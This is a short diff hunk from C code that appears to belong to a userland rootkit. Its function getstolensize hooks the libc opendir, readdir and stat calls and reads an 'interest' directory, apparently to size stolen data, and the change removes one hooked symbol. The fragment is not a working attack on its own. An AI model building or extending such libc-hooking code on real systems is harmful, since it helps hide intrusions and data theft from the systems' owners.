@@ -4,7 +4,7 @@ off_t getstolensize(void){
     struct dirent *dir;
     struct stat sbuf;
 
-    hook(COPENDIR, CREADDIR, C__XSTAT, C__LXSTAT);
+    hook(COPENDIR, CREADDIR, C__LXSTAT);
 
     dp = call(COPENDIR, INTEREST_DIR);
     if(dp == NULL) return 0;
